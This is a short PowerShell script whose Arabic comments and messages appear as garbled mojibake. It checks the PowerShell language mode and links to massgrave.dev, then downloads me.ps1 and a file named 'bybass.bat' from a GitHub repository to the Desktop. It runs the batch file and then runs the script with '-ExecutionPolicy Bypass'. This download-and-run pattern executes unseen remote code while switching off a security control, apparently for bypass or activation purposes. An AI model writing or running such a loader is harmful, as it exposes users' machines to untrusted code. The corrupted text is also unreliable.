# Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¶Ø¹ Ù„ØºØ© PowerShell
if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
    Write-Host "âŒ PowerShell Ù„Ø§ ÙŠØ¹Ù…Ù„ ÙÙŠ Ø§Ù„ÙˆØ¶Ø¹ Ø§Ù„ÙƒØ§Ù…Ù„!" -ForegroundColor Red
    Write-Host "ğŸ”¹ Ù„Ø­Ù„ Ø§Ù„Ù…Ø´ÙƒÙ„Ø©: https://massgrave.dev/fix_powershell" -ForegroundColor Cyan
    return
}

# ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¥Ù„Ù‰ Ø³Ø·Ø­ Ø§Ù„Ù…ÙƒØªØ¨
$desktop = [System.Environment]::GetFolderPath("Desktop")
$files = @(
    @{url = "https://raw.githubusercontent.com/defeat11/sav2/main/me.ps1"; path = "$desktop\me.ps1"},
    @{url = "https://raw.githubusercontent.com/defeat11/sav2/main/bybass.bat"; path = "$desktop\me.bat"}
)

foreach ($file in $files) {
    try {
        Invoke-WebRequest -Uri $file.url -OutFile $file.path -UseBasicParsing
        if (-not (Test-Path $file.path)) { throw "ÙØ´Ù„ ØªÙ†Ø²ÙŠÙ„ $($file.path)" }
        Write-Host "âœ… ØªÙ… ØªÙ†Ø²ÙŠÙ„: $($file.path)" -ForegroundColor Green
    } catch {
        Write-Host "âŒ Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªÙ†Ø²ÙŠÙ„: $($file.url)" -ForegroundColor Red
        Write-Host "ğŸ”¹ ØªØ£ÙƒØ¯ Ù…Ù† Ø§ØªØµØ§Ù„ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª Ø£Ùˆ Ø£Ù† Ø§Ù„Ø±Ø§Ø¨Ø· ØµØ­ÙŠØ­." -ForegroundColor Yellow
        return
    }
}

# ØªØ´ØºÙŠÙ„ Ù…Ù„Ù .bat Ø¨Ø¹Ø¯ ØªÙ†Ø²ÙŠÙ„Ù‡
Start-Process -FilePath "$desktop\me.bat" -Wait

# ØªØ´ØºÙŠÙ„ Ù…Ù„Ù PowerShell Ø¨Ø¹Ø¯ ØªÙ†ÙÙŠØ° .bat
Start-Process -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$desktop\me.ps1`"" -Wait

Write-Host "ğŸš€ ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¨Ù†Ø¬Ø§Ø­!" -ForegroundColor Cyan
